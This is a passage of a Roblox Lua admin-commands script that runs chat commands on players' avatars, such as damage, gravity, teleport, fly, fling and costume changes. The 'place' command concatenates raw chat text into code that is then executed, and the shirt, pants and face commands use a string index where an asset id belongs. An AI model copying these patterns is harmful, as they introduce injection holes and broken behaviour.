for a, tool in pairs(game.Lighting:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if msg:lower():sub(chk1+1) == "all" or tool.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then tool:Clone().Parent = v.Backpack end
end
end
end
end))
end
end

if msg:lower():sub(1,12) == "removetools " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v:findFirstChild("Backpack") then 
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,5) == "rank " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:IsInGroup(msg:sub(chk1+1)) then 
Hint("[" .. v:GetRankInGroup(msg:sub(chk1+1)) .. "] " .. v:GetRoleInGroup(msg:sub(chk1+1)), {plr})
elseif v and not v:IsInGroup(msg:sub(chk1+1))then
Hint(v.Name .. " is not in the group " .. msg:sub(chk1+1), {plr})
end
end))
end
end

if msg:lower():sub(1,7) == "damage " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid:TakeDamage(msg:sub(chk1+1))
end
end))
end
end

if msg:lower():sub(1,5) == "grav " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,8) == "setgrav " then
local chk1 = msg:lower():sub(9):find(" ") + 8
local plrz = GetPlr(plr, msg:lower():sub(9,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*msg:sub(chk1+1),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*msg:sub(chk1+1),0) end end
end
end))
end
end

if msg:lower():sub(1,7) == "nograv " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end))
end
end

if msg:lower():sub(1,7) == "health " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = msg:sub(chk1+1)
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end))
end
end

if msg:lower():sub(1,6) == "speed " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.WalkSpeed = msg:sub(chk1+1)
end
end))
end
end

if msg:lower():sub(1,5) == "team " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and game:findFirstChild("Teams") then 
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(msg:lower():sub(chk1+1)) == 1 then v.TeamColor = tm.TeamColor end
end
end
end))
end
end

if msg:lower():sub(1,6) == "place " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then 
local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[game:service("TeleportService"):Teleport(]] .. msg:sub(chk1+1) .. ")" cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,3) == "tp " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
local plrz2 = GetPlr(plr, msg:lower():sub(chk1+1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
for i2, v2 in pairs(plrz2) do
if v and v2 and v.Character and v2.Character and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
end
end
end))
end
end

if msg:lower():sub(1,7) == "change " then
local chk1 = msg:lower():sub(8):find(" ") + 7
local chk2 = msg:sub(chk1+1):find(" ") + chk1
local plrz = GetPlr(plr, msg:lower():sub(8,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("leaderstats") then 
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(msg:sub(chk1+1,chk2-1)) == 1 then st.Value = msg:sub(chk2+1) end
end
end
end))
end
end

if msg:lower():sub(1,6) == "shirt " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for i,v in pairs(v.Character:children()) do
if v:IsA("Shirt") then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. chk1 v:Destroy() end
end
end
end))
end
end

if msg:lower():sub(1,6) == "pants " then
local chk1 = msg:lower():sub(7):find(" ") + 6
local plrz = GetPlr(plr, msg:lower():sub(7,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for i,v in pairs(v.Character:children()) do
if v:IsA("Pants") then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=" .. chk1 v:Destroy() end
end
end
end))
end
end

if msg:lower():sub(1,5) == "face " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then 
v.Character.Head:findFirstChild("face").Texture = "http://www.roblox.com/asset/?id=" .. chk1
end
end))
end
end

---------------------
--   FunCommands   --
---------------------
if FunCommands or plr.userId == game.CreatorId or ChkOwner(plr.Name:lower()) then
	
if msg:lower():sub(1,8) == "swagify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:findFirstChild("Torso")
local torso = plr.Character.Torso
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474" p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,6) == "music " then
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = msg:sub(7)
local pitch = 1
if tostring(id):lower():find("caramell") then id = 2303479 end
if tostring(id):find("epic") then id = 27697743 pitch = 2.5 end
if tostring(id):find("rick") then id = 2027611 end
if tostring(id):find("halo") then id = 1034065  end
if tostring(id):find("pokemon") then id = 1372261 end
if tostring(id):find("cursed") then id = 1372257 end
if tostring(id):find("extreme") then id = 11420933 end
if tostring(id):find("awaken") then id = 27697277 end
if tostring(id):find("alone") then id = 27697392 end
if tostring(id):find("mario") then id = 1280470 end
if tostring(id):find("choir") then id = 1372258 end
if tostring(id):find("chrono") then id = 1280463 end
if tostring(id):find("dotr") then id = 11420922 end
if tostring(id):find("entertain") then id = 27697267 end
if tostring(id):find("fantasy") then id = 1280473 end
if tostring(id):find("final") then id = 1280414 end
if tostring(id):find("emblem") then id = 1372259 end
if tostring(id):find("flight") then id = 27697719 end
if tostring(id):find("banjo") then id = 27697298 end
if tostring(id):find("gothic") then id = 27697743 end
if tostring(id):find("hiphop") then id = 27697735 end
if tostring(id):find("intro") then id = 27697707 end
if tostring(id):find("mule") then id = 1077604 end
if tostring(id):find("film") then id = 27697713 end
if tostring(id):find("nezz") then id = 8610025 end
if tostring(id):find("angel") then id = 1372260 end
if tostring(id):find("resist") then id = 27697234 end
if tostring(id):find("schala") then id = 5985787 end
if tostring(id):find("organ") then id = 11231513 end
if tostring(id):find("tunnel") then id = 9650822 end
if tostring(id):find("spanish") then id = 5982975 end
if tostring(id):find("venom") then id = 1372262 end
if tostring(id):find("wind") then id = 1015394 end
if tostring(id):find("guitar") then id = 5986151 end
local s = Instance.new("Sound", game.Workspace) s.SoundId = "http://www.roblox.com/asset/?id=" .. id s.Volume = 1 s.Pitch = pitch s.Looped = true s.archivable = false repeat s:Play() wait(2.5) s:Stop() wait(.5) s:Play() until s.IsPlaying
end

if msg:lower() == "stopmusic" then
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end

if msg:lower() == "musiclist" then
if plr.PlayerGui:findFirstChild("MUSICGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "MUSICGUI" scr.Parent = plr.PlayerGui
local list = {"caramell","epic","rick","halo","pokemon","cursed","extreme","awaken","alone","mario","choir","chrono","dotr","entertain","fantasy","final","emblem","flight","banjo","gothic","hiphop","intro","mule","film","nezz","angel","resist","schala","organ","tunnel","spanish","venom","wind","guitar"}
for i, v in pairs(list) do local cl = ent:Clone() cl.Parent = cmf cl.Text = v cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end

if msg:lower():sub(1,4) == "fly " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Name = "FlyScript" cl.Code.Value = [[repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()]]
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,6) == "unfly " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
for a, q in pairs(v.PlayerGui:children()) do if q.Name == "FlyScript" then q:Destroy() end end
for a, q in pairs(v.Character.Torso:children()) do if q.Name == "BodyGyro" or q.Name == "BodyVelocity" then q:Destroy() end end
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower() == "disco" then
for i, v in pairs(lobjs) do v:Destroy() end
local cl = script.ScriptBase:Clone() cl.Name = "LightEdit" cl.Code.Value = [[repeat wait(.1) local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game.Lighting.Ambient = color
game.Lighting.FogColor = color
until nil]]
table.insert(lobjs, cl) cl.Parent = game.Workspace cl.Disabled = false
end

if msg:lower() == "flash" then
for i, v in pairs(lobjs) do v:Destroy() end
local cl = script.ScriptBase:Clone() cl.Name = "LightEdit" cl.Code.Value = [[repeat wait(.1) 
game.Lighting.Ambient = Color3.new(1,1,1)
game.Lighting.FogColor = Color3.new(1,1,1)
game.Lighting.Brightness = 1
game.Lighting.TimeOfDay = 14
wait(.1) 
game.Lighting.Ambient = Color3.new(0,0,0)
game.Lighting.FogColor = Color3.new(0,0,0)
game.Lighting.Brightness = 0
game.Lighting.TimeOfDay = 0
until nil]]
table.insert(lobjs, cl) cl.Parent = game.Workspace cl.Disabled = false
end

if msg:lower():sub(1,5) == "spin " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end))
end
end

if msg:lower():sub(1,7) == "unspin " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,4) == "dog " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end))
end
end

if msg:lower():sub(1,6) == "undog " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end))
end
end

if msg:lower():sub(1,8) == "creeper " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end))
end
end

if msg:lower():sub(1,10) == "uncreeper " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end))
end
end

if msg:lower():sub(1,8) == "bighead " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end))
end
end

if msg:lower():sub(1,9) == "minihead " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(.75,.75,.75) v.Character.Torso.Neck.C0 = CFrame.new(0,.8,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end))
end
end

if msg:lower():sub(1,6) == "fling " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then 
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
v.Character.Humanoid.Sit = true v.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end))
end
end

if msg:lower():sub(1,8) == "seizure " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(math.rad(90),0,0) 
local cl = script.ScriptBase:Clone() cl.Name = "SeizureBase" cl.Code.Value = [[repeat wait() script.Parent.Humanoid.PlatformStand = true script.Parent.Torso.Velocity = Vector3.new(math.random(-10,10),-5,math.random(-10,10)) script.Parent.Torso.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)) until nil]]
table.insert(objects, cl) cl.Parent = v.Character cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,10) == "unseizure " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for i,v in pairs(v.Character:children()) do if v.Name == "SeizureBase" then v:Destroy() end end
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end

if msg:lower():sub(1,12) == "removelimbs " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and (obj.Name:find("Leg") or obj.Name:find("Arm")) then obj:Destroy() end
end
end
end))
end
end

if msg:lower():sub(1,5) == "name " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
local char = v.Character
local mod = Instance.new("Model", char) mod.Name = msg:sub(chk1+1)
local cl = char.Head:Clone() cl.Parent = mod local hum = Instance.new("Humanoid", mod) hum.Name = "NameTag" hum.MaxHealth = 0 hum.Health = 0
local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
char.Head.Transparency = 1
end
end))
end
end

if msg:lower():sub(1,7) == "unname " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
end
end))
end
end

if msg:lower():sub(1,5) == "char " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. msg:sub(chk1+1)
v:LoadCharacter()
end
end))
end
end

if msg:lower():sub(1,7) == "unchar " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then 
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. v.userId
v:LoadCharacter()
end
end))
end
end

if msg:lower():sub(1,7) == "infect " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
Infect(v.Character)
end
end))
end
end

if msg:lower():sub(1,11) == "rainbowify " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
